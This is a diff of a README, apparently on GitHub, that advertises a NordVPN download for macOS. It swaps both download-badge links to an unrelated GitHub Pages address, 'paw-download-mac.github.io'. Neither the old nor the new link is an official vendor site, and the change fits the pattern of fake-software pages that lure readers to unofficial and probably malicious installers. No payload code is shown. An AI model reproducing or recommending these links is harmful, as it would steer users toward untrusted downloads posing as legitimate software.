@@ -7,7 +7,7 @@ Optimized for macOS and Apple Silicon, NordVPN offers a seamless and reliable ex
 ---
 
 ## ✅ Download NordVPN for macOS  
-[![Download NordVPN](https://img.shields.io/badge/Download-NordVPN-blueviolet)](nordvpn-download-mac.github.io)
+[![Download NordVPN](https://img.shields.io/badge/Download-NordVPN-blueviolet)](https://paw-download-mac.github.io/.github)
 
 ---
 
@@ -67,7 +67,7 @@ Fully compatible with the latest macOS versions and Apple Silicon chips, NordVPN
 
 ---
 
-[![Download NordVPN](https://img.shields.io/badge/Download-NordVPN-blueviolet)](nordvpn-download-mac.github.io)
+[![Download NordVPN](https://img.shields.io/badge/Download-NordVPN-blueviolet)](https://paw-download-mac.github.io/.github)
 
 ---
 
